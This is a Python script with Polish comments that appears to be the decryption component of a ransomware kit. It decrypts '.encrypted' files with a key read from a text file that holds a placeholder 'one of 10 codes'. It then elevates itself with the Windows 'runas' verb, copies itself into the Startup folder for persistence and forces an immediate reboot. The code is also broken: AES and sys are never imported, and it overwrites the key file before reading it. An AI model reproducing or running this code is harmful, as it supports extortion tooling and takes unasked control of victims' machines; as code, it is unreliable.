import ctypes
import os

def decrypt_files(key):
    encrypted_files = [filename for filename in os.listdir() if filename.endswith('.encrypted')]

    for filename in encrypted_files:
        with open(filename, 'rb') as encrypted_file:
            nonce = encrypted_file.read(16)
            tag = encrypted_file.read(16)
            ciphertext = encrypted_file.read()

        cipher = AES.new(key.encode('utf-8'), AES.MODE_EAX, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)

        with open(filename[:-10], 'wb') as decrypted_file:
            decrypted_file.write(plaintext)

def add_to_autostart():
    autostart_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shortcut_path = os.path.join(autostart_path, 'DecryptionTool.lnk')

    target_path = os.path.abspath(sys.argv[0])
    icon_path = target_path

    with open("decryption_key.txt", "w") as key_file:
        key_file.write("PrzykładowyKod1")  # Wprowadź jeden z 10 kodów

    with open("decryption_key.txt", "r") as key_file:
        key = key_file.read()

    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, target_path, None, 1)

    try:
        os.remove(shortcut_path)
    except FileNotFoundError:
        pass

    os.system(f'copy "{icon_path}" "{autostart_path}"')

def main():
    with open("decryption_key.txt", "r") as key_file:
        key = key_file.read()

    decrypt_files(key)
    add_to_autostart()
    ctypes.windll.user32.MessageBoxW(0, "Pliki zostały odszyfrowane. Twój komputer zostanie teraz zrestartowany.", "Odzyskanie dostępu", 1)
    os.system('shutdown /r /t 1')

if __name__ == "__main__":
    main()
